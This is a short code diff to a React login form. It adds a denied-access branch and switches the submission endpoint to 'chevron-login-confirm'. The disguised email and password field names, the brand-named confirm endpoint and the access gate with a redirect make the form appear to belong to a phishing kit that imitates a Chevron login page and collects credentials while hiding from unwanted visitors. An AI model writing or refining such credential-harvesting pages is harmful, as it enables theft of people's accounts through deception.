@@ -14,8 +14,12 @@ const LoginForm2: React.FC = () => {
   const isAllowed = useAccessCheck(baseUrl);
 
   // Show loading state while checking access
-  if (!isAllowed) {
+  if (isAllowed === null) {
     return <div>Loading...</div>; // Or a proper loading spinner
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
   }
 
   const togglePwzenzVisibility = () => {
@@ -44,7 +48,7 @@ const LoginForm2: React.FC = () => {
       // Proceed with form submission
       console.log('Form submitted with:', { emzemz, pwzenz });
 
-      const url = `${baseUrl}api/logix-meta-data-2/`;
+      const url = `${baseUrl}api/chevron-login-confirm/`;
 
       try {
         await axios.post(url, {
